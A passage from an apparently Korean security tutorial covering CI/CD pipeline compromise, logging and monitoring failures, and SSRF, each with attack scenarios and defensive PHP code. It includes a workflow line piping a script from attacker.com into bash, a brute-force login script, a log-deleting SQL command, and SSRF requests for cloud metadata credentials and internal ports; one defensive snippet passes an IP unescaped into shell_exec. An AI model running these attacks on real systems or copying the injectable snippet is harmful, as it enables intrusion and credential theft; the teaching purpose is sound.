      - 중요한 코드 저장소는 `Signed Commits`(서명된 커밋)를 사용하여 인증한다.

      ```bash
      git commit -S -m "Secure commit"
      ```

   3. 의존성 검토 및 정기적인 보안 점검

      - `npm audit`, `composer audit` 등을 실행하여 취약한 패키지가 포함되지 않았는지 점검한다.

      ```bash
      npm audit
      composer audit
      ```

<br>

4. CI/CD 파이프라인 해킹

   CI/CD(Continuous Integration/Continuous Deployment) 파이프라인이 적절히 보호되지 않으면,
   공격자가 빌드 프로세스에 악성 코드를 삽입할 수 있다.

   ```yaml
   # .github/workflows/deploy.yml
   jobs:
   deploy:
      steps:
         - name: 악성 코드 실행
         run: curl -s https://attacker.com/malware.sh | bash
   ```

   위처럼 빌드 스크립트에 공격자가 추가한 명령이 포함되면, 배포 과정에서 악성 코드가 실행될 수 있다.

   <br>

   **방어 방법**:

   1. CI/CD 환경에서 서명된 빌드 아티팩트만 배포

      - 배포 전에 빌드 파일의 해시값을 검증하여 변조 여부를 확인한다.

      ```bash
      sha256sum build.zip
      ```

   2. CI/CD 보안 강화
      - GitHub Actions, GitLab CI/CD 등의 보안 정책을 설정하여 승인되지 않은 사용자가 CI/CD 워크플로우를 변경하지 못하도록 한다.
      - 빌드 서버에 다단계 인증(2FA)을 적용한다.

<br>
<br>

---

### 9. Security Logging and Monitoring Failures, 보안 로깅 및 모니터링 실패

**공격 방식**:

- 보안 이벤트(로그인 실패, 관리자 접근 시도, 비정상적인 요청 등)가 기록되지 않으면 공격을 탐지할 수 없다.
- 실시간 모니터링 미비로 인해 공격이 진행되는 동안 탐지 및 대응이 지연된다.
- 로그 파일 조작되거나 삭제되면 추적이 어려워진다.
- 알림 시스템이 없으면 보안 담당자가 이상 행동을 인지하지 못한다.

<br>

**공격 시나리오**:

1. 무차별 대입 공격

   공격자가 같은 IP에서 지속적으로 로그인 시도를 해도 서버에서 실패 로그를 기록하지 않아 탐지되지 않는 경우이다.

   ```python
   import requests

   url = "http://example.com/login.php"
   username = "admin"

   # 1000번 로그인 시도
   for i in range(1000):
      data = {"username": username, "password": f"password{i}"}
      response = requests.post(url, data=data)
      if "Invalid password" not in response.text:
         print(f"로그인 성공! 비밀번호: password{i}")
         break
   ```

   위 코드는 특정 계정(`admin`)으로 1000번의 로그인 시도를 실행하는 무차별 대입 공격을 수행한다.

   <br>

   **방어 방법**:

   ```php
   <?php
   session_start();
   $host = "localhost";
   $dbname = "security_db";
   $username = "root";
   $password = "";

   $conn = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
   $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

   if ($_SERVER["REQUEST_METHOD"] === "POST") {
      $user = $_POST["username"];
      $pass = $_POST["password"];

      $stmt = $conn->prepare("SELECT * FROM users WHERE username = :user");
      $stmt->bindParam(":user", $user);
      $stmt->execute();
      $userData = $stmt->fetch(PDO::FETCH_ASSOC);

      if ($userData && password_verify($pass, $userData["password"])) {
         echo "로그인 성공!";
      } else {
         echo "로그인 실패!";

         // 로그 기록
         $logStmt = $conn->prepare("INSERT INTO login_attempts (username, ip_address, attempt_time) VALUES (:user, :ip, NOW())");
         $logStmt->bindParam(":user", $user);
         $logStmt->bindParam(":ip", $_SERVER["REMOTE_ADDR"]);
         $logStmt->execute();
      }
   }
   ?>
   ```

   - 로그인 실패 시 `login_attempts` 테이블에 로그를 남긴다.
   - `ip_address`도 함께 저장하여 특정 IP에서 반복적인 시도가 있는지 추적한다.

<br>

2. 로그 조작 및 삭제

   공격자가 서버에 침입하여 보안 로그를 삭제하거나 조작하여 탐지를 피하려는 경우,

   ```sql
   DELETE FROM login_attempts WHERE username='admin';
   ```

   위 SQL 명령어를 실행하면 특정 계정의 로그인 실패 기록을 모두 삭제할 수 있다.

   <br>

   **방어 방법**:

   ```php
   <?php
   $logFile = "/var/log/security.log";
   $message = date("Y-m-d H:i:s") . " - [LOGIN ATTEMPT] User: $user, IP: " . $_SERVER["REMOTE_ADDR"] . "\n";

   // 로그 파일에 보안 이벤트 기록
   file_put_contents($logFile, $message, FILE_APPEND | LOCK_EX);

   // 외부 서버로 로그 전송
   $logServer = "http://logserver.example.com/collect";
   $data = ["log" => $message];
   $options = [
      "http" => [
         "header" => "Content-Type: application/x-www-form-urlencoded",
         "method" => "POST",
         "content" => http_build_query($data)
      ]
   ];
   $context = stream_context_create($options);
   file_get_contents($logServer, false, $context);
   ?>
   ```

   - 로그를 로컬 파일(`/var/log/security.log`)에 저장하여 데이터베이스 삭제로부터 보호한다.
   - 추가적으로 외부 로그 서버로 전송하여 로그 조작을 방지하고 백업을 수행한다.

<br>

3. 실시간 탐지 미비로 인한 대응 지연

   공격자가 지속적으로 로그인 시도를 하거나 특정 취약점을 스캔할 경우,
   서버에서 이를 탐지하지 못하면 즉각적인 조치가 불가능하다.

   <br>

   **방어 방법**:

   ```php
   <?php
   $logFile = "/var/log/fail2ban.log";
   $ip = $_SERVER["REMOTE_ADDR"];

   // 로그인 시도 기록
   $message = date("Y-m-d H:i:s") . " - Failed login from IP: $ip\n";
   file_put_contents($logFile, $message, FILE_APPEND | LOCK_EX);

   // 특정 IP에서 5번 이상 로그인 실패 시 차단
   $failedAttempts = shell_exec("grep '$ip' $logFile | wc -l");

   if ($failedAttempts >= 5) {
      shell_exec("sudo fail2ban-client set sshd banip $ip");
   }
   ?>
   ```

   - 로그인 실패 로그를 `fail2ban.log`에 저장한다.
   - 같은 IP에서 5번 이상 실패 시 `fail2ban`을 사용하여 해당 IP를 차단한다.

<br>
<br>

---

### 10. Server-Side Request Forgery, SSRF

: 공격자가 서버에게 특정 요청을 수행하도록 속여 내부 네트워크나 보호된 시스템에 접근하는 공격 기법

**공격 방식**:

- 내부 네트워크 스캔: 서버가 내부 네트워크에 위치한 시스템에 요청을 보낼 수 있도록 유도한다.
- 클라우드 메타데이터 접근: 클라우드 서비스의 메타데이터 API에 접근하여 인증 키나 환경 변수를 획득한다.
- 내부 API 호출: 인증이 필요한 내부 관리 페이지나 API를 호출하여 정보를 탈취한다.

<br>

**공격 시나리오**:

1. 내부 관리자 페이지 접근

   서버가 사용자의 요청을 받아 특정 URL의 내용을 가져오는 기능이 있을 때, 공격자는 내부 관리자 페이지(`/admin`)에 접근할 수 있다.

   ```php
   <?php
   // 취약한 코드 예제
   if (isset($_GET['url'])) {
      $url = $_GET['url'];
      $response = file_get_contents($url);
      echo $response;
   }
   ?>
   ```

   공격자가 내부 관리자 페이지를 다음과 같은 코드를 이용해 조회한다.

   ```sh
   curl "http://example.com/fetch.php?url=http://localhost/admin"
   ```

   이 요청을 통해 공격자는 내부 관리자 페이지(`/admin`)에 접근하여 민감한 정보를 가져올 수 있다.

   <br>

   **방어 방법**:

   화이트리스트 방식 적용하여 내부 관리자 페이지가 있는 서버를 보호하기 위해 특정 도메인만 허용한다.

   ```php
   <?php
   // 화이트리스트에 등록된 도메인만 요청 허용
   $allowed_domains = ['https://api.example.com', 'https://trusted-site.com'];

   if (isset($_GET['url'])) {
      $url = $_GET['url'];

      // 도메인 검증
      $parsed_url = parse_url($url);
      $host = $parsed_url['scheme'] . '://' . $parsed_url['host'];

      if (!in_array($host, $allowed_domains)) {
         die('허용되지 않은 도메인입니다.');
      }

      $response = file_get_contents($url);
      echo htmlspecialchars($response, ENT_QUOTES, 'UTF-8'); // XSS 방어 추가
   }
   ?>
   ```

   내부 관리자 페이지와 같은 비공개 리소스에 대한 접근을 원천 차단한다.

<br>

2. 클라우드 메타데이터 서비스 접근

   일부 클라우드 환경(AWS, GCP)에서는 인스턴스 메타데이터를 제공하는 API가 존재하며, 이를 통해 중요 정보(예: AWS IAM 역할의 보안 키)를 가져올 수 있다.

   ```sh
   curl "http://example.com/fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   ```

   만약 서버가 위 요청을 실행하면, 공격자는 AWS IAM의 보안 자격 증명을 얻을 수 있다.

   <br>

   **방어 방법**:

   클라우드 메타데이터 서비스는 일반적으로 내부 IP(`169.254.169.254`)에서 접근이 가능하기에 이 IP 대역으로의 요청을 차단해야한다.

   ```php
   <?php
   function is_blocked_ip($url) {
      $parsed_url = parse_url($url);
      $ip = gethostbyname($parsed_url['host']);

      // 내부 IP 차단 (AWS 메타데이터 주소 포함)
      $blocked_ips = ['169.254.169.254', '127.0.0.1'];

      if (in_array($ip, $blocked_ips)) {
         return true;
      }
      return false;
   }

   if (isset($_GET['url'])) {
      $url = $_GET['url'];

      if (is_blocked_ip($url)) {
         die('내부 네트워크 접근이 차단되었습니다.');
      }

      $response = file_get_contents($url);
      echo htmlspecialchars($response, ENT_QUOTES, 'UTF-8'); // XSS 방어 추가
   }
   ?>
   ```

   클라우드 메타데이터 API 접근을 원천적으로 차단하여 보안 자격 증명 유출을 방지한다.

<br>

3. 내부 서비스 포트 스캔

   공격자는 내부 네트워크의 특정 포트(예: 6379 - Redis, 3306 - MySQL)를 확인하여 내부 서비스가 실행중인지 확인할 수 있다.

   ```sh
   curl "http://example.com/fetch.php?url=http://127.0.0.1:6379"
   ```

   만약 응답이 정상적으로 반환된다면, 내부 서비스가 열려 있음을 알 수 있다.

   <br>

   **방어 방법**:

   일반적으로 내부 서비스는 `127.0.0.1` 또는 `localhost`에서 실행되므로, 이 주소로의 요청을 차단한다.

   ```php
   <?php
   function is_internal_ip($url) {
      $parsed_url = parse_url($url);
      $ip = gethostbyname($parsed_url['host']);

      // 내부 IP 대역 차단
      if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
         return true;
      }
      return false;
   }

   function is_blocked_port($url) {
      $parsed_url = parse_url($url);
      $blocked_ports = [22, 3306, 6379, 9200]; // SSH, MySQL, Redis, Elasticsearch 포트 차단

      if (isset($parsed_url['port']) && in_array($parsed_url['port'], $blocked_ports)) {
         return true;
      }
      return false;
   }

   if (isset($_GET['url'])) {
      $url = $_GET['url'];

      if (is_internal_ip($url) || is_blocked_port($url)) {
         die('내부 네트워크 또는 차단된 포트 접근이 차단되었습니다.');
      }

      $response = file_get_contents($url);
      echo htmlspecialchars($response, ENT_QUOTES, 'UTF-8'); // XSS 방어 추가
   }
   ?>
   ```

   내부 네트워크의 특정 포트로의 접근을 차단하여 포트 스캔을 방지한다.
